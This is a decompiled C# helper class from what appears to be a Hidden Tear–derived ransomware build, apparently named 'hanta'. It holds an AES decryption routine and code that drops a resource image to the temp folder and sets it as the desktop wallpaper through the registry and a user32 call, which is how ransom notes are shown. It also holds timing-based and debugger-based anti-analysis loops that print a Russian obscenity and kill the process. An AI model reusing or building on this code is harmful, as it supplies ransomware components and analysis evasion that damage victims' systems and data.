using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;
using hanta.Properties;

namespace hidden_tear;

internal class help
{
	public enum Style
	{
		Tiled,
		Centered,
		Stretched
	}

	private const int SPI_SETDESKWALLPAPER = 20;

	private const int SPIF_UPDATEINIFILE = 1;

	private const int SPIF_SENDWININICHANGE = 2;

	public static byte[] AES_Decrypt(byte[] bytesToBeDecrypted, byte[] passwordBytes)
	{
		byte[] result = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Mode = CipherMode.CBC;
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		return result;
	}

	public static string DecryptText(string input, string password)
	{
		byte[] bytesToBeDecrypted = Convert.FromBase64String(input);
		byte[] bytes = Encoding.UTF8.GetBytes(password);
		bytes = SHA256.Create().ComputeHash(bytes);
		byte[] bytes2 = AES_Decrypt(bytesToBeDecrypted, bytes);
		return Encoding.UTF8.GetString(bytes2);
	}

	public static void set_wallpaper()
	{
		byte[] bytes = ImageToByte((Image)(object)Resources.wall);
		string path = Path.Combine(Path.GetTempPath(), "wall.jpg");
		File.WriteAllBytes(path, bytes);
		Set();
	}

	public static byte[] ImageToByte(Image img)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		ImageConverter val = new ImageConverter();
		return (byte[])((TypeConverter)(object)val).ConvertTo((object?)img, typeof(byte[]));
	}

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

	public static void Set()
	{
		string lpvParam = Path.Combine(Path.GetTempPath(), "wall.jpg");
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", writable: true);
		registryKey.SetValue("WallpaperStyle", 1.ToString());
		registryKey.SetValue("TileWallpaper", 0.ToString());
		SystemParametersInfo(20, 0, lpvParam, 3);
	}

	public static void DateCheck()
	{
		//IL_000b: Unknown result type (might be due to invalid IL or missing references)
		while (true)
		{
			DateTime now = DateTime.Now;
			Thread.Sleep(500);
			TimeSpan timeSpan = DateTime.Now.AddSeconds(0.5).Subtract(now);
			Console.WriteLine(timeSpan.Seconds);
			if (timeSpan.Seconds > 1)
			{
				MessageBox.Show("пошёл нахуй");
				Process.GetCurrentProcess().Kill();
			}
		}
	}

	public static void anti_debug()
	{
		//IL_000b: Unknown result type (might be due to invalid IL or missing references)
		while (true)
		{
			Thread.Sleep(500);
			if (Debugger.IsAttached)
			{
				MessageBox.Show("пошёл нахуй");
				Process.GetCurrentProcess().Kill();
			}
		}
	}
}
